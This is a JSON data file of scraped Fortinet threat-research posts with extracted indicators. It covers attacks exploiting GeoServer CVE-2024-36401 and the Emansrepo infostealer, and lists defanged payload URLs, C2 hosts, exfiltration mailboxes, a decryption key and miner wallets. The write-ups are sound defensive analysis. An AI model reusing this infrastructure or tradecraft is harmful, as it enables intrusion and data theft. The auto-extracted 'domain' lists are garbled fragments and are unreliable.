          "10.10.11.31"
        ],
        "domain": [
          "heDateTimeTab",
          "",
          "c",
          "esourcesreports",
          "ite",
          "ilesysinitd",
          "jmgmXsB",
          "assdic",
          "urpcollaborator",
          "ileDateTimeTab",
          "esourcereports",
          "ilepassdic",
          "orizon3",
          "ww",
          "ootkitsysinitd",
          "ileinstall",
          "ead",
          "akeup",
          "ndex",
          "alledLDSupport",
          "433",
          "amessysinitdandsysinitd",
          "oDateTimeTab",
          "tyle",
          "F",
          "ystemd-private-2e4a6ea82da94a9b9fec37fe91c9b820-broker",
          "eports",
          "sers",
          "ndDateTimeTab",
          "alleds",
          "utput",
          "fsysinitdandsysinitd",
          "owxuintgredogzgblrsmr2cx2e471bor",
          "roker",
          "yslog",
          "esourceDateTimeTab",
          "Sxhmgm",
          "ownload",
          "ateTimeTab",
          "ysinitd",
          "nDemand",
          "hereports",
          "herc",
          "ndsysinitd",
          "lient",
          "alledhelp",
          "ileu",
          "criptinstall",
          "ndu",
          "alledsysinitd",
          "irewall",
          "hesysinitdandsysinitd",
          "ageOnDemand",
          "atetime",
          "freports"
        ],
        "hash_md5": [
          "2e4a6ea82da94a9b9fec37fe91c9b820"
        ],
        "hash_sha1": [
          "beb723a5f20a1a2c4375f9aa250d968d55155689",
          "64efc1aad330ea9d98c0c705e16cd4b3af7e74f8"
        ],
        "hash_sha256": [
          "8d016d02f8fbe25dce76481a90dd0b48630ce9e74e8c31ba007cf133e48b8526",
          "6edd7b3123de985846a805931ca8ee5f6f7ed7b160144aa0e066967bc7c0423a",
          "d57a2cac394a778e19ce9b926f2e0a71936510798f30d20f207f2a49b49ce7b1"
        ],
        "cve": [
          "CVE-2024-8190",
          "CVE-2024-29824",
          "CVE-2024-8963"
        ],
        "email": [],
        "url": [
          "http://temp",
          "https://www.fortiguard.com/encyclopedia/ips/56651",
          "http://l8u6aolk4ejfsl9zeq6321zvwm2eq3",
          "https://10.10.11.31/client/site.php",
          "https://www.fortiguard.com/threat"
        ]
      },
      "threat_score": 0.8673469387755102
    }
  },
  {
    "id": "Fortinet_85854",
    "source": "Fortinet",
    "title": "Threat Actors Exploit GeoServer Vulnerability CVE-2024-36401",
    "text": "FortiGuard Labs Threat Research Affected Platforms:GeoServer prior to versions 2.23.6, 2.24.4, and 2.25.2Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical GeoServer is anopen-source softwareserver written in Java that allows users to share and edit geospatial data. It is the reference implementation of the Open Geospatial Consortium (OGC) Web Feature Service (WFS) and Web Coverage Service (WCS) standards. On July 1, the project maintainers released anadvisoryfor the vulnerabilityCVE-2024-36401(CVSS score: 9.8). Multiple OGC request parameters allow remote code execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The shortcoming has beenaddressedin versions 2.23.6, 2.24.4, and 2.25.2. On July 15, the U. S. Cybersecurity and Infrastructure Security Agency (CISA)addeda critical security flaw impacting OSGeo GeoServer GeoTools to its Known Exploited Vulnerabilities (KEV) catalog based on evidence of active exploitation. FortiGuard Labs added theIPS signaturethe next day and has observed multiple campaigns targeting this vulnerability to spread malware. The botnet family and miner groups strike the attack immediately. We also collect sidewalk backdoors, and GOREVERSE tries to exploit this vulnerability and set a connection with a command and control server (C2) to execute malicious actions. In this article, we will explore the details of the payload and malware. The payload retrieves a script from “hxxp://181[.]214[.]58[.]14:61231/remote.sh.” The script file first verifies the victim’s operating system and architecture to download the appropriate file, which it saves as “download_file.” It accommodates various OS types, including Linux, FreeBSD, Illumos, NetBSD, OpenBSD, and Solaris. After execution, it deletes the file to remove traces of its activity. The ultimate executable is “GOREVERSE,\" packed with UPX. GOREVERSE is a malicious tool that often functions as areverse proxy server, allowing attackers to illicitly access target systems or data. Once executed, the connection is made to a specific IP address (181[.]214[.]58[.]14) and port (18201), which is not a standard SSH port. From the exploitation packet of CVE-2024-36401, we observed threat actors attempting to access IT service providers in India, technology companies in the U. S., government entities in Belgium, and telecommunications companies in Thailand and Brazil. The attacker fetches the script from “hxxp://1[.]download765[.]online/d.” This batch file facilitates the download of execution files. All the ELF files on the remote server, known as the “SideWalk” malware, are designed to operate on ARM, MIPS, and X86 architectures. SideWalk is a sophisticated Linux backdoor malware also often linked with the hacking groupAPT41. First, SideWalk creates a folder named with a randomly generated string in the TMP directory. It then decodes two library files, libc.so.0 and ld-uClibc.so.1, along with the next-stage payload using the XOR key 0xCC. These decoded files are then stored in the previously created folder in the TMP path. Then, it also uses XOR to decode the string data using the key 0x89. It then executes the next stage payload, “ych7s5vvbb669ab8a.” It has three main functions: 1. Decrypt configuration: The configuration is decrypted using the ChaCha20 algorithm. The binary input contains a 16-byte MD5 hash, a 12-byte nonce for ChaCha20 decryption, and a 4-byte section indicating the length of the ciphertext, followed by the actual ciphertext. Based on the assembly code, the decryption key is hard-coded as “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” and the decryption process runs 15 rounds (0xF). After successful decryption, the extracted C2 is secure[.]systemupdatecdn[.]de (47[.]253[.]46[.]11), listening on port 80, with the mutex name “hfdmzbtu.” 2. Establish C2 communication: Communication with the C2 server is established using an encrypted session, also based on the ChaCha20 algorithm. The packet structure comprises a 4-byte section representing the packet length, a 12-byte nonce for ChaCha20 decryption, 20 bytes of message metadata, and the final ciphertext. The initial exchange includes keys (v-key and s-key) for subsequent message encryption. In early packets, the original key, “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” decrypts the message metadata, while the exchanged keys (v-key and s-key) decrypt the ciphertext. In packet 5, the victim’s information (computer name, operating system, and system time) is transmitted. 3. Execute the command issued by C2: In this attack scenario, we find a Plugin namedFast Reverse Proxy(FRP.) Fast Reverse Proxy (FRP) is a legitimate and widely-used tool that complicates the detection of malicious network traffic by blending it with normal traffic, thereby enhancing the stealthiness of cyberattacks. Because it is open source, this tool has been leveraged in the past by several threat actors, such asMagic Hound,Fox Kitten, andVolt Typhoon. Using FRP, attackers create an encrypted tunnel from an internally compromised machine to an external server under their control. This method enables them to maintain a foothold within compromised environments, exfiltrate sensitive data, deploy further malicious payloads, or execute other operations. In this attack case, SideWalk also downloads a customized configuration file that directs the connection to a remote server (47[.]253[.]83[.]86) via port 443, further enhancing the attacker's control and persistence. Analysis of the script download URL's telemetry reveals a concentrated pattern of infections. The primary targets appear to be distributed across three main regions: South America, Europe, and Asia. This geographical spread suggests a sophisticated and far-reaching attack campaign, potentially exploiting vulnerabilities common to these diverse markets or targeting specific industries prevalent in these areas. This script downloads and executes a file named “sky” from a specified URL, “hxxp://188[.]214[.]27[.]50:4782. “ It changes its permissions to make it executable, runs it with the parameter “geo,” and then deletes the file. The configuration data is extracted by XORing the file contents with 0x3A. This enabled us to find information like “bots[.]gxz[.]me,” which is the C2 server the malware attempts to connect to. When executing the malware, a string shows up. This malware has a credential list for brute-force attacks and a hard-coded payload related to the Huawei router vulnerability CVE-2017-17215. The payload attempts to download malware from 59[.]59[.]59[.]59. The attacker first terminates several processes (mpsl, mipsel, bash.mpsl, mips, x86_64, x86), then downloads and executes multiple bot binaries for different CPU architectures (such as ARM, MIPS, PPC, X86, M68K, SH4, and MPSL) from a remote server, “hxxp://209[.]146[.]124[.]181:8030.” The binaries are fetched using wget, saved in the /tmp directory, made executable (chmod 777), and executed. The following section uses “bot.arm7” as an example. The malware can be recognized by the specified string “condi.” Executing the malware sends numerous DNS queries to “trcpay[.]xyz.” The Condi botnet first tries to resolve the C2 server address and its function. It then establishes a connection with the C2 server and waits to parse the command. The malware has numerous DDoS attack methods, such as TCP flooding, UDP flooding, and a VSE DDoS attack. In tracing the connection back to the remote server, “hxxp://209[.]146[.]124[.]181:8030,” we found that it was built as an HFS (HTTP File Server) and that two malicious tools—“Linux2.4” (another botnet) and “taskhost.exe” (the agent tool)—are located in the server. The botnet “Linux2.4” not only has different methods that can trigger a DDoS attack but can also act as a backdoor agent. The tool first connects to a server, which is the same as the remote server “209[.]146[.]124[.]181.” It then gathers the host information. Later, it waits for the command to either conduct a remote command execution or trigger a DDoS attack. The Backdoor malware “taskhost.exe” is designed especially for Windows. It creates a service named “9jzf5” for persistence and then creates different process types to retrieve information from attackers lurking in the host. We found four types of incident coin miners that can be delivered to victim hosts, as shown in the following details. The attacker downloads a script from a remote URL “hxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860[.]txt/test.sh” and saves it as script.sh in the temp folder. The payload within the incident packets then modifies and executes the script to achieve various purposes. The script first gathers host information, such as the location of Aegis, the distribution version of Linux. Afterward, it attempts to uninstall different cloud platforms, like Tencent Cloud, Oracle, Kingsoft Cloud, JD Cloud, and Ali Cloud, to evade monitoring agents from those cloud services. A noteworthy point is that the comments in the script are written in simplified Chinese, indicating that the miner campaign/author may be affiliated with a Chinese group. While finishing these uninstalls, the script kills some security defense mechanisms processes and checks whether the current user has the root privilege needed to uninstall those mechanisms. If everything executes successfully, the script downloads the coin miner and creates another script for persistence. The coin miner, named “sshd,” wrote the configuration within itself. The miner points to two target pools: “sdfasdfsf[.]9527527[.]xyz:3333” and “gsdasdfadfs[.]9527527[.]xyz:3333.” Another type of coin miner attack begins with the Base64-encoded command. It intends to download “linux.sh” from “hxxp://repositorylinux.com.” The comment in “linux.sh” is written in Sundanese, an Indonesian language. The script downloads two files: a coin miner named “linuxsys“ and a related configuration file named “config.json.” It downloads these through an AWS (Amazon Web Service) cloud platform service the attacker holds. The coin miner sets the pool URL “pool[.]supportxmr[.]com:80” with credentials using “config.json.” The miner itself is XMRig, which can be recognized through its data. The action sent via four packets is to download “/tmp/MmkfszDi” from the remote server “hxxp://95[.]85[.]93[.]196:80/asdfakjg.sh,” make it executable, and then run it. The script downloads a coin miner like the others mentioned before. It also removes a list of files within “/tmp,” “/var,” \"/usr,\" and “/opt.” The coin miner named “h4” is similar to the other two types mentioned. It is XMRig as well and embeds its configuration within the binary file. The miner sets the pool URL as “asdfghjk[.]youdontcare[.]com:81” The last type of coin miner incident command is also encoded with base64. It downloads “cron.sh” from “112[.]133[.]194[.]254.” This fraudulent site mimics the webpage of the Institute of Chartered Accountants of India (ICAI). The site is currently removed. “cron.sh” uses the job scheduler on the Unix-like operating system “cron,” as its name indicates. The script schedules jobs for things like downloading coin miner-related scripts and setting the scripts into “crontab.” It first downloads the script named “check.sh” from the same source IP “112[.]133[.]194[.]254” and executes the script. “check.sh” first creates the necessary directories and confirms that the victim host hasn’t been infected. Once the script finds that the victim host is the first to be infected, it downloads “config.sh” from the attacker’s IP “112[.]133[.]194[.]254” and the XMRig coin miner from the developer platform “Github.” Through “config.sh,” we learned that the attacker set the pool on SupportXMR “pool[.]supportxmr[.]com:3333” While GeoServer’s open-source nature offers flexibility and customization, it also necessitates vigilant security practices to address its vulnerabilities. The developer patched the vulnerability with the function “JXPathUtils.newSafeContext” instead of the original vulnerable one to evaluate the XPath expression safety. However, implementing comprehensive cybersecurity measures—such as regularly updating software, employing threat detection tools, and enforcing strict access controls—can significantly mitigate these risks. By proactively addressing these threats, organizations can secure their environments and ensure the protection and reliability of these data infrastructures. The malware described in this report is detected and blocked by FortiGuard Antivirus as: Adware/MinerBASH/Agent. CPC!trBASH/Miner. VZ!trData/Miner.2F82!trData/Miner.3792!trELF/Agent. CPN!trELF/Agent. CPN. TRELF/BitCoinMiner. HF!trELF/Flooder. B!trLinux/CoinMiner. ACZ!trLinux/Mirai. CEA!trLinux/Mirai. CJS!trLinux/Mirai. IZ1H9!trLinux/SideWalk. Q!trRiskware/CoinMinerW32/ServStart. IO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard Web Filtering Service blocks the C2 servers and downloads URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2024-36401:GeoServer. OGC. Eval. Remote. Code. Execution We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://181[.]214[.]58[.]14:61231/remote.shhxxp://1[.]download765[.]online/dhxxp://188[.]214[.]27[.]50:4782/skyhxxp://209[.]146[.]124[.]181:8030/bot[.]armhxxp://209[.]146[.]124[.]181:8030/bot[.]arm5hxxp://209[.]146[.]124[.]181:8030/bot[.]arm6hxxp://209[.]146[.]124[.]181:8030/bot[.]arm7hxxp://209[.]146[.]124[.]181:8030/bot[.]m68khxxp://209[.]146[.]124[.]181:8030/bot[.]mipshxxp://209[.]146[.]124[.]181:8030/bot[.]mpslhxxp://209[.]146[.]124[.]181:8030/bot[.]ppchxxp://209[.]146[.]124[.]181:8030/bot[.]sh4hxxp://209[.]146[.]124[.]181:8030/bot[.]x86hxxp://209[.]146[.]124[.]181:8030/bot[.]x86_64hxxp://209[.]146[.]124[.]181:8030/JrLinuxhxxp://209[.]146[.]124[.]181:8030/Linux2[.]4hxxp://209[.]146[.]124[.]181:8030/Linux2[.]6hxxp://209[.]146[.]124[.]181:8030/taskhost[.]exehxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860.txt/test.shhxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860.txt/sshdhxxp://ec2-54-191-168-81[.]us-west-2.compute.amazonaws.com/css/linuxsyshxxp://ec2-54-191-168-81[.]us-west-2.compute.amazonaws.com/css/config.jsonhxxp://ec2-13-250-11-113[.]ap-southeast-1.compute.amazonaws.com/css/linuxsyshxxp://ec2-13-250-11-113[.]ap-southeast-1.compute.amazonaws.com/css/config.jsonhxxp://95[.]85[.]93[.]196:80/h4hxxp://112[.]133[.]194[.]254/cron.shhxxp://112[.]133[.]194[.]254/check.shhxxp://112[.]133[.]194[.]254/config.sh 181[.]214[.]58[.]14:1820147[.]253[.]46[.]11secure[.]systemupdatecdn[.]de188[.]214[.]27[.]50bots[.]gxz[.]me209[.]146[.]124[.]181sdfasdfsf[.]9527527[.]xyz:3333gsdasdfadfs[.]9527527[.]xyz:3333pool[.]supportxmr[.]com:8095[.]85[.]93[.]196:4443pool[.]supportxmr[.]com:333359[.]59[.]59[.]59 49VQVgmN9vYccj2tEgD7qgJPbLiGQcQ4uJxTRkTJUCZXRruR7HFD7keebLdYj6Bf5xZKhFKFANFxZhj3BCmRT9pe4NG325b+5000041qqpRxT7ocGsbZPeU9JcbfRiHLy3j8DWhdKzv8Yr2VS1QPcFLmfHVJFWEBDfWaB3N6HxuVuAb73nES36bN2rhevGnZ12nA b80e9466b7bb42959c29546b8c052e67fcaa0f591857617457d5d28348bd8860d9e8b390f8e2e8a6c2308c723a6a812f59c055ecad4e9098a120e5c4c65d390579c9532fb6ef2742e207498bfe2b2ee09aa9773376ac0e56085083aab17b98be5cc7e35254347f705422800bfb7fe29c6002e2537f6bac0ff996a720dfb5f48efabbb4611fb9df5d8f208d9353be0b73c3942fe78903da096cbfe2f47c9e35661588bee7db42495ba7e6e34d217e6b82c5ab93f27c1eea68435cbb9e7792f9bee8b0f5a952f07c83c4d67809ac0715c7164d518323d8038542e84aab8456db433c73ebc7a85accc65c9ee5bf151f70b990e5a12f27a843ca21c0f9d9a10fd17d9bf642a7e14f0a0b0a784f00a0d1cf590ac60ae5ae378d29d435519f4d9dbf2b994b924b00fb56e12a6a987c4cdf65dd05a221c47b5fc0a7a2babf1f05c2ed38c226744b40e8f5d2cf95b4fb2537ff00e222ecc2d24c5096ecfadb14b4a47f9796cf27a66b629d2b19708c6887441a8422b40dc0e9e7c5c0f2212efe0b6b3323b3a015b6650ec9800fa878ff9a5f732013806c8dcb0e7069515dae0dd380fda450b7e615b8cdc45486b6ed1c1c081c7a92c262edb84318fa864531dcab753f82f7b97677b6387c1f02d429e98868bf6973a8dec14dfee2516a27e885d6b1c780b60d7fb66caf103a04e81fb89dbb05111b4b0ef513f3769c8e0a8106ab01a075a9e7b5284182d3881c865895ee6e0fb03273eec3dcbf4bfc82dd2b069245beaec3101b0b74d76a95ba91b6cc4945657e928d2dac8fdf926ffbf09031d46e9186b67ab1b9b66fdc2c4ed1689698a54a347c2bdd6eaff87039ae337675243670d883fb74bb852bbd722e6ebc4e249e49cb4bb4194493a26d62d4bfcdfca299841253994a35a57970dea48e97009f65ad045b69a83234b771b106446211376a6866f3d3572ef96c9c59e137425ca6804e1b86b7f8b57210a3724d567017460774de1af8e068aa7377f0055640af581a412aa9d7288c912a93dd0d739657af0079fb1abd8cbd64d1d9c8d56b7ea6273ed62e1471f300fabc67dbc2416a48e2faf33daddccd0ecb643251af2e79e878b19a8e9c8f1c87302e732ef057cdba821f4b30d9dfe98b5fba09e17dbe29dfeb8deb7d777d4a3b0d670914691ed360b916116ad9dfe98b5fba09e17dbe29dfeb8deb7d777d4a3b0d670914691ed360b916116a8d3440301bc94ed83cdafb69e4b0166d3a0020eb4f38e9fa159c2f13f14b2d29a13a979f4ca57450528bb6cd7aa2bf47d2eea211053eb1a14b8c4a44fd6618317194ec436231c2a383ffc7c75eef4f5b5a952c18fa176ffd0830667835a8053320d97f144bf7b1662a13ac537715126b9b2f68eff46a4a09234743ae236f0177d72e4cabffc84a31e50caf827b6e579cf6e4932e5cbc528a65a68728ba56b65b5abf8a52d45f6d5970fab8d1dfd05b6ee7b0ef57df935f45761b89d3522fa59224e80d66759b1c7a075aeb4fe0321eb6ac49eaf509089fd2882874ec6228d0857355cc094f2e43e4dd7b8b698b559abe6d2d74cc48f5cfa464424314c6e41944689504850db842365cd47eadd2d3d42888b9261e7d9e884f14bb7deeb21bb61d762707f2c7fc4731c4c46ecb3364a4e7ace8984aa899cc57c624b342d3efa03f4234eb5eb42fbe44d7163c4388d263b3fe57fb1e56bf56152ac352c3fd0beec0373734730d8414d32883ebbd105c7a7c58397df995759c4e0bd367f2523d302dd1d25730122f8bc125251832c6af03aedd705dfcc2d9eebcce4371c54bb84b393dce929b1c091abac3342788624f1ffa4be5d603eec4d7ab39b604694ac05d22eb2f95bb2059a3690259f2c0d7537b3cad858869650b9c220d2d81e3720b6dde2e0e324e36fafe71f5d2bcf521e6415dafbc3f1173ad77f1f3daa77bb581da5f5d9eb83b4a6f2d49580e1658263eb972be336a2cad15a84561d17d59391191b075d7b6264f5a574bc75400c9d57282e9344d8b2df576ad2a36ab7e2575d5a395e5e5122ba6d0b06f7ed8e57ab5324ae730970c0d23913f27b9ecc9094182c03d275302d03a4378f1b852e6d783d3181c2899ae0e9ebad4c7160221320863c425653a4ad0b00e59a01142f899b6aac9712cfb25063b5b9b2e7e3171f7f3a897ed8fad39ec0671d9b401712ddbc1f24942b2ee2f4865b6ffcd2f019036e03cbadec8b76b63644d2946fd0af72b48fa59f07a78e1f84464cff5e9b1ca4110e6113e3928c5874249cc71b2d88e5c0c00989ac394238747bb7638897fc210531b4aab7d052cffcf97b303d11c5d35fa9bc860155601cdea21e38447401571b35d2db1c81d4770e812ddc883ead8ff41fd2e5a7d5bc8056521219ccf8784219d1bd819bf56711bbe0b1dac3b1481d36e7ae2f312da5f404c554c2c45a01fe591b8464d5c9722d3dc72dbeafec00256887867bad46d347a5fc797d57fc9e0fd317035d33369ddc627282eb38346e1a56118026dd3ccdb29b18ffff88ecf3663296ee6da FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401",
      "scraped_at": "2025-07-20T13:45:56.051199",
      "indicators": {
        "ip_address": [],
        "domain": [
          "1929e87-85ff-4e98-a837-ae0079c9c860",
          "mazonaws",
          "epositorylinux",
          "s-west-2",
          "ibc",
          "askhost",
          "est",
          "cript",
          "inux",
          "ash",
          "emote",
          "onfig",
          "sdfakjg",
          "ron",
          "XPathUtils",
          "p-southeast-1",
          "d-uClibc",
          "heck"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2024-36401",
          "CVE-2017-17215"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.5284147557328016
    }
  },
  {
    "id": "Fortinet_97123",
    "source": "Fortinet",
    "title": "Emansrepo Stealer: Multi-Vector Attack Chains",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In August 2024, FortiGuard Labs observed a python infostealer we call Emansrepo that is distributed via emails that include fake purchase orders and invoices. Emansrepo compresses data from the victim’s browsers and files in specific paths into a zip file and sends it to the attacker’s email. According to our research, this campaign has been ongoing since November 2023. The attacker sent a phishing mail containing an HTML file, which was redirected to the download link for Emansrepo. This variant is packaged by PyInstaller so it can run on a computer without Python. As time goes by, the attack flow has become increasingly complex. Below are the attack flows we found in July and August 2024: Various stages are being added to the attack flow before downloading Emansrepo, and multiple mailboxes are used to receive different kinds of stolen data. This article will provide a detailed analysis of each attack chain and its behavior. We will then provide a quick summary of the next campaign. The attachment is a dropper that mimics a download page. It creates a link element that points to the data of Purchase-Order.7z and uses the click() method to “download” Purchase-Order.7z. Six seconds later, it redirects to a completely unrelated website. Purchase-Order.exe, the file embedded in Purchase-Order.7z, is an AutoIt-compiled executable. It doesn’t include any files, and the AutoIt script determines its behavior. The script has many unused functions, frustrating its analysis. The only meaningful code downloads preoffice.zip to the Temp folder and unzips it into % TEMP%\\PythonTemp. The zip archive contains necessary Python modules and tester.py, the malicious script for information stealing. The innermost file in P. O.7z is an HTA file. Its source file is a JavaScript file that shows a hidden window named PowerShell Script Runner and downloads the PowerShell script, script.ps1, with VBScript for the next stage. The behavior of script.ps1 is similar to the AutoIt script in chain 1. It downloads preoffice.zip to the Temp folder and unzips it to %TEMP%\\PythonTemp, but it executes Emansrepo using run.bat. The 7z file from the link in the phishing mail contains a batch file obfuscated by BatchShield. After deobfuscation, we can see that it is not as complicated as it first seems. It simply downloads and executes script.ps1 using PowerShell. According to the email receiving the data, the infostealer behavior can be divided into three parts. It creates folders to temporarily store the stolen data for each part and deletes them after sending the data to the attacker. The stolen data is attached to the email sent to the attacker. In part 1, the Python stealer collects login data, credit card information, web history, download history, autofill, and text files (less than 0.2 MB) from the Desktop, Document, and Downloads folders. minesmtp8714@maternamedical[.]top minestealer8412@maternamedical[.]top amigo, torch, kometa, orbitum, cent-browser, 7star, sputnik, vivaldi, google-chrome-sxs, google-chrome, epic-privacy-browser, microsoft-edge, uran, yandex, brave, iridium Folder and files %TEMP%\\Browsers: Text files (less than 0.2 MB) copied from Desktop, Document, Downloads %TEMP%\\Browsers\\{browser name}: Saved_Passwords.txt, Saved_Credit_Cards.txt, Browser_History.txt, Download_History.txt, Autofill_Data.txt Zip file of%TEMP%\\Browsersfolder Part 1 includes the initial features of Emansrepo since there is only code for part 1 in the November 2023 variant (e346f6b36569d7b8c52a55403a6b78ae0ed15c0aaae4011490404bdb04ff28e5). It’s worth noting thatemans841 reporthas been used as the divider in Saved_Passwords.txt since the December 2023 variant (ae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a). Because of this, we call it Emansrepo. The variant used in November 2023 usesPrysmax Premiumas the divider. By comparing the variant in November 2023 with the first edition of the Prysmax stealer shared on GitHub, we find they contain many similar functions, though the Emansrepo stealer had fewer features. However, as parts 2 and 3 were added to Emansrepo, it has become quite different from the Prysmax stealer. Part 2 copies PDF files (less than 0.1 MB) from the Desktop, Document, Downloads, and Recents folders and compresses folders of browser extensions, crypto wallets, and game platforms into zip files. extensionsmtp@maternamedical[.]top filelogs@maternamedical[.]top Opera, Chrome, Brave, Vivaldi, Yandex, Edge Crypto wallet Atomic Wallet, Guarda, Zcash, Armory, Bytecoin, Exodus, Binance, Electrum, Coinomi, jaxx Game platform Steam, Riot Games Browser extension MetaMask, BNB Chain Wallet, Coinbase Wallet, Ronin Wallet, Trust Wallet, Venom Wallet, Sui Wallet, Martian Aptos & Sui Wallet, TronLink, Petra Aptos Wallet, Pontem Crypto Wallet, Fewcha Move Wallet, Math Wallet, Coin98 Wallet, Authenticator, Exodus Web3 Wallet, Phantom, Core | Crypto Wallet & NFT, TokenPocket - Web3 & Nostr Wallet, SafePal Extension Wallet, Solflare Wallet, Kaikas, iWallet, Yoroi, Guarda, Jaxx Liberty, Wombat, Oxygen - Atomic Crypto Wallet, MEW CX, GuildWallet, Saturn Wallet, Station Wallet, Harmony, EVER Wallet, KardiaChain Wallet, Pali Wallet, BOLT X, Liquality Wallet, XDEFI Wallet, Nami, MultiversX Wallet, Temple - Tezos Wallet, XMR. PT Folder and files in temp folder %TEMP%\\pdf_temps: PDF files (less than 0.1 MB) copied from Desktop, Document, Downloads and Recents folder {extension ID}.zip {data folder}.zip All files in pdf_temp Part 3 copies cookie files and zips it into {process_name}_cookies.zip. cookiesmtp@maternamedical[.]top cooklielogs@maternamedical[.]top Chrome, msedge, brave, opera, 360se, 360browser, yandex, UCBrowser, QQBrowser Folder and files in temp folder %TEMP%\\cookies_data: {process_name}_cookies.zip Zip files in cookies_data We recently found another attack campaign using the Remcos malware, which we believe is related to the same attacker because of the phishing email. As the above screenshot shows, these attacks have the same content but use different methods to distribute malware. The attack flow for Remcos is much simpler. The attacker just sends phishing emails with a malicious attachment. The attachment is a DBatLoader, which downloads and decrypts data for the payload. The payload is a Remcos protected by a packer. Emansrepo has been active since at least last November, and the attack method is continuously evolving. The attack vectors and malware are ever-changing and pervasive, so it’s vital for organizations to maintain cybersecurity awareness. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W32/Kryptik. EB!trJS/Agent. FEI!trBAT/Downloader.2C22!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeFortinet Cybersecurity Fundamentals (FCF) training, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://bafybeigm3wrvmyw5de667rzdgdnct2fvwumyf6zyzybzh3tqvv5jhlx2ta[.]ipfs[.]dweb[.]link/wetrankfr[.]ziphxxps://bafybeifhhbimsau6a6x4m2ghdmzer5c3ixfztpocqqudlo4oyzer224q4y[.]ipfs[.]w3s[.]link/myscr649612[.]jshttps://estanciaferreira[.]com[.]br/wp-includes/TIANJIN-DOC-05082024-xls[.]7zhxxps://dasmake[.]top/reader/timer[.]phphxxps://hedam[.]shop/simple/Enquiry.7z191[.]101[.]130[.]185192[.]236[.]232[.]35 stealsmtp@dasmake[.]xyzhanbox@dasmake[.]xyzpublicsmtp@dasmake[.]xyzpublicbox@dasmake[.]xyzminesmtp8714@dasmake[.]xyzminestealer8412@dasmake.xyzminesmtp8714@maternamedical[.]topminestealer8412@maternamedical[.]topextensionsmtp@maternamedical[.]topfilelogs@maternamedical[.]topcookiesmtp@maternamedical[.]topcooklielogs@maternamedical[.]top a6c2df5df1253f50bd49e7083fef6cdac544d97db4a6c9c30d7852c4fd6519219e5580d7c3c22e37b589ec8eea2dae423c8e63f8f666c83edabecf70a0948b999bd3b8d9ac6ad680b0d0e39b82a439feedd87b9af580f37fa3d80d2c252fef8c915bad0e2dbe0a18423c046f84d0ff7232fff4e5ba255cc710783f6e4929ab3264e5c9e7b8dfb8ca8ca73895aa51e585fa7e5414f0e1d10659d3a83b9f770333b343cce5381b8633b3fd3da56698f60db70c75422e120235a00517d519e37d8d32bcbce53bfee33112b447340e7114d6d46be4ccf1a5391ad685431afdc8fb86 bee8da411e71547ac765a5e63e177b59582df438432cc3b540b57a6f1a56dd1670ba3d67b476e98419ecbbbb5d81efcb5a07f55a92c96e7b9207176746e3b7a6a2fa6790035c7af64146158f1ed20cb54f4589783e1f260a5d8e4f30b81df70d4cd8c9fa7f5e2484b73ed9c7be55aa859969c3f21ca2834610102231d337841d6670e5c7521966e82d091e7adff4e16335f03f2e2740b653adcc9bfe35c7bf9bdd656953a6844dd9585f05545a513c4e8c2ded13e06cdb67a0e58eda7575a7a49866934dd2b4e411cdabaa7a96a63f153921a6489f01b0b40d7febed48b02c22 e346f6b36569d7b8c52a55403a6b78ae0ed15c0aaae4011490404bdb04ff28e58e43c97e5bc62211b3673dee13e376a1f5026502ebe9fd9f7f455dc17c253b7fae2a5a02d0ef173b1d38a26c5a88b796f4ee2e8f36ee00931c468cd496fb2b5a7a9826be22b6d977d6a0e5179f84d8e88b279fe6d9df8f6c93ebc40a6ba70f0618459be33cd4f59081098435a0fbaa649f301f985647a75d21b7fc337378e59b6e7313b6aa37a00b602e620a25a0b71a74503ea967f1814c6c7b8b192535a043222dd76c461e70c3cb330bacfcf465751b07331c4f8a4415c09f4cd7c4e6fcd96e7313b6aa37a00b602e620a25a0b71a74503ea967f1814c6c7b8b192535a043 infostealer,security attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 